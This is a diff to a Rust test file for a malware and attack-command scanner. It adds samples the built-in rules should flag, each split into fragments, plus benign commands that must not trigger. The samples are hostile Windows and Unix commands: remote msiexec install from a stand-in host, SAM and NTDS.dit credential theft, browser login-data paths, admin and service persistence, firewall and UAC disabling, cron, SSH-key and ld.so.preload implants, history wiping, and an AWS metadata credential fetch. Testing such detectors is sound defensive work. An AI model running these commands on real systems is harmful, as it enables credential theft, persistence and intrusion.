@@ -168,6 +168,81 @@ fn samples() -> Vec<(&'static str, Vec<u8>)> {
             "builtin.c2.tor-onion-v3",
             text(&[&"a".repeat(56), ".onion"]),
         ),
+        (
+            "builtin.lolbin.wmic-process-create",
+            text(&["wm", "ic /node:host process call cr", "eate cmd.exe"]),
+        ),
+        (
+            "builtin.lolbin.msiexec-remote",
+            text(&["msi", "exec /q /i http://x.example/a.msi"]),
+        ),
+        (
+            "builtin.lolbin.cmstp-inf",
+            text(&["cm", "stp.exe /s /ns a.inf"]),
+        ),
+        (
+            "builtin.credential.registry-hive-save",
+            text(&["re", "g save HKLM\\SA", "M sam.save"]),
+        ),
+        (
+            "builtin.credential.ntds-dit",
+            text(&["C:\\Windows\\NT", "DS\\nt", "ds.dit"]),
+        ),
+        (
+            "builtin.credential.browser-login-data",
+            text(&[
+                "C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data",
+                "\\Default\\Login",
+                " Data",
+            ]),
+        ),
+        (
+            "builtin.persistence.local-admin-add",
+            text(&["net loc", "algroup administrators bob /a", "dd"]),
+        ),
+        (
+            "builtin.persistence.new-service",
+            text(&["sc cre", "ate svc binPath= C:\\a.exe start= auto"]),
+        ),
+        (
+            "builtin.evasion.firewall-disable",
+            text(&["net", "sh advfirewall set allprofiles state off"]),
+        ),
+        (
+            "builtin.evasion.uac-disable",
+            text(&[
+                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
+                "\\Policies\\System /v Enable",
+                "LUA /t REG_DWORD /d 0",
+            ]),
+        ),
+        (
+            "builtin.script.office-dde-command",
+            text(&["DDE", "AUTO c:\\windows\\system32\\cm", "d.exe /k x"]),
+        ),
+        (
+            "builtin.unix.cron-append",
+            text(&["(cron", "tab -l; echo '* * * * * /tmp/x') | cron", "tab -"]),
+        ),
+        (
+            "builtin.unix.ssh-authorized-keys-append",
+            text(&["echo ssh-ed25519 AAAA >> ~/.ssh/", "authorized_keys"]),
+        ),
+        (
+            "builtin.unix.ld-preload-file",
+            text(&["echo /tmp/x.so > /etc/ld.so", ".preload"]),
+        ),
+        (
+            "builtin.unix.history-tamper",
+            text(&["unset HIST", "FILE; history -c"]),
+        ),
+        (
+            "builtin.cloud.aws-metadata-credentials",
+            text(&[
+                "curl http://169.254.169.254/latest/meta-data/",
+                "iam/security-credentials/role",
+            ]),
+        ),
         ("builtin.binary.upx-packed", upx),
     ]
 }
@@ -216,6 +291,12 @@ fn builtin_pack_stays_quiet_on_ordinary_text() {
         "Sub Main()\n  MsgBox \"hello\"\nEnd Sub",
         "Your files have been saved.",
         "certutil -hashfile a.exe SHA256",
+        "net localgroup administrators",
+        "sc query spooler",
+        "msiexec /i C:\\setup\\app.msi",
+        "netsh advfirewall show allprofiles",
+        "crontab -l",
+        "wmic os get caption",
     ];
     for text in ordinary {
         let report = scan_source(BUILTIN_RULES, text.as_bytes()).unwrap();
